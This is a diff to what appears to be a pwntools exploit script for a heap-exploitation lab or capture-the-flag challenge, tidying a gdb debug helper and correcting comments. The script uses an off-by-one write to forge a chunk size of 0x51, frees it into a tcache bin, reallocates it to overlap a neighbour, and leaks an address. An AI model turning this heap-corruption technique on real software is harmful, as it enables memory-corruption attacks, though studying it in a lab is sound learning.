@@ -17,15 +17,8 @@ uu64    = lambda data               :u64(data.ljust(8, '\0'))
 lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
 
 def debug(breakpoint=''):
-    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
-    gdbscript = 'directory %smalloc/\n' % glibc_dir
-    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
-    gdbscript += 'directory %sstdlib/\n' % glibc_dir
-    gdbscript += 'directory %slibio/\n' % glibc_dir
-    gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
@@ -104,19 +97,19 @@ alloc(6, 0x10)
 #                                               }  
 
 
-## Use off by one to modify the size field of chunk_1 to be 0x61 (0x41 originally)
+## Use off by one to modify the size field of chunk_1 to be 0x51 (0x41 originally)
 read(0, "a" * 0x18 + '\x51')
 
 
 
-## Free chunk_1, since its size field is modified to 0x61, it would be placed into tcachebin(0x40)
-## tcachebin(0x40) --> chunk_1
+## Free chunk_1, since its size field is modified to 0x51, it would be placed into tcachebin(0x50)
+## tcachebin(0x50) --> chunk_1
 free(1)
 
 
-## Then allocate a new heap chunk with size 0x40, it would be taken out from tachebin(0x40) chunk_1
-## tcachebin(0x40) --> nullptr
-## Since the actual size of chunk_1 is 0x20, it overlap with chunk_2
+## Then allocate a new heap chunk with size 0x40, it would be taken out from tachebin(0x50) chunk_1
+## tcachebin(0x50) --> nullptr
+## Since the actual size of chunk_1 is 0x30, it overlap with chunk_2
 alloc(1, 0x40)
 
 
@@ -126,10 +119,6 @@ free(2)
 
 ## Leak the address by chunk_1
 read(1, "a" * 0x41)
-
-
-## Since chunk 1 is in unsorted bin, the first 8 bytes is the address of unsorted bin
-## unsorted_bin --> chunk 1 --> unsorted_bin
 leak_addr = u64(write(1)[0x40 : 0x46] + "\x00\x00")
 
 
